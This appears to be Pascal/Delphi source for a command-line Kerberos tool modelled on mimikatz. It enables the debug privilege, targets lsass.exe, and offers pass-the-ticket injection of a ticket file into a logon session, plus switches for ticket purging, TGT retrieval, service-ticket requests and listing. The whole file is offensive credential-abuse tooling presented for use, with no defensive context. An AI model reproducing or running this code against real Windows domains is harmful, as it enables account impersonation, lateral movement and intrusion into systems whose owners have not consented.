program krb;

uses windows,sysutils,
  kerberos,utils,uadvapi32,upsapi;

var
  p,dw,ret:dword;
  luid,binary,input:string;
  inhandle:thandle;
  pb:pointer;
  label fin;

begin

//*****************************
p:=pos('/binary:',cmdline);
  if p>0 then
       begin
       binary:=copy(cmdline,p,1024); //length(cmdline)-p
       binary:=stringreplace(binary,'/binary:','',[rfReplaceAll, rfIgnoreCase]);
       //delete(binary,pos(' ',binary),255);
       delete(binary,pos('/',binary),1024);
       binary:=trim(binary);
       //

       end;
  p:=pos('/input:',cmdline);
  if p>0 then
       begin
       input:=copy(cmdline,p,2048);
       input:=stringreplace(input,'/input:','',[rfReplaceAll, rfIgnoreCase]);
       //delete(input,pos(' ',input),2048);
       delete(input,pos(' /',input),2048);
       input:=trim(input);
       end;
  p:=pos('/luid:',cmdline);
  if p>0 then
       begin
       luid:=copy(cmdline,p,255);
       luid:=stringreplace(luid,'/luid:','',[rfReplaceAll, rfIgnoreCase]);
       delete(luid,pos(' ',luid),255);
       end;
  p:=pos('/verbose',cmdline);
  if p>0 then verbose:=true;
//*****************************

debugpriv:=EnableDebugPriv('SeDebugPrivilege');
lsass_pid:=upsapi._EnumProc2('lsass.exe');

  p:=pos('/ptt',cmdline);
  if p>0 then
   begin
   if luid='' then luid:='0';
   if luid<>'' then luid:=stringreplace(luid,'0x','$',[rfignorecase]);
   inhandle:=thandle(-1);
   inhandle := CreateFile(pchar(binary), GENERIC_READ , FILE_SHARE_READ , nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
   dw := GetFileSize(inhandle,nil)  ;
   pb:=allocmem(dw);ret:=0;
   if inhandle<>thandle(-1) then ReadFile(inhandle,pb^,dw,ret,nil);
   if inhandle<>thandle(-1) then closehandle(inhandle);
   if ret<>0 then
     begin
     if kuhl_m_kerberos_init=0 then
        begin
        kuhl_m_kerberos_use_ticket(pb,ret,strtoint(luid));
        kuhl_m_kerberos_clean ;
        end;
     end;
   goto fin;
   end;
  p:=pos('/purge',cmdline);
  if p>0 then
   begin
   if luid='' then luid:='0';
   if luid<>'' then luid:=stringreplace(luid,'0x','$',[rfignorecase]);
   if kuhl_m_kerberos_init=0 then
      begin
      kuhl_m_kerberos_purge_ticket(strtoint(luid)) ;
      kuhl_m_kerberos_clean ;
      end;
   goto fin;
   end;
  p:=pos('/tgt',cmdline);
  if p>0 then
   begin
   if luid='' then luid:='0';
   if luid<>'' then luid:=stringreplace(luid,'0x','$',[rfignorecase]);
   if kuhl_m_kerberos_init=0 then
      begin
      kuhl_m_kerberos_tgt(strtoint(luid)) ; //a different luid will lead to SEC_E_NO_CREDENTIALS
      kuhl_m_kerberos_clean ;
      end;
   goto fin;
   end;
  p:=pos('/ask',cmdline);
  if p>0 then
   begin
   if luid='' then luid:='0';
   if luid<>'' then luid:=stringreplace(luid,'0x','$',[rfignorecase]);
   if kuhl_m_kerberos_init=0 then
      begin
      kuhl_m_kerberos_ask(input,true,strtoint(luid)) ;
      kuhl_m_kerberos_clean ;
      end;
   goto fin;
   end;
  p:=pos('/klist',cmdline);
  if p>0 then
   begin
   if luid='' then luid:='0';
   if luid<>'' then luid:=stringreplace(luid,'0x','$',[rfignorecase]);
   if kuhl_m_kerberos_init=0 then
      begin
      kuhl_m_kerberos_list(strtoint(luid)) ;
      //GetActiveUserNames(@callback_enumlogonsession);
      kuhl_m_kerberos_clean ;
      end;
   goto fin;
   end;

fin:
end.

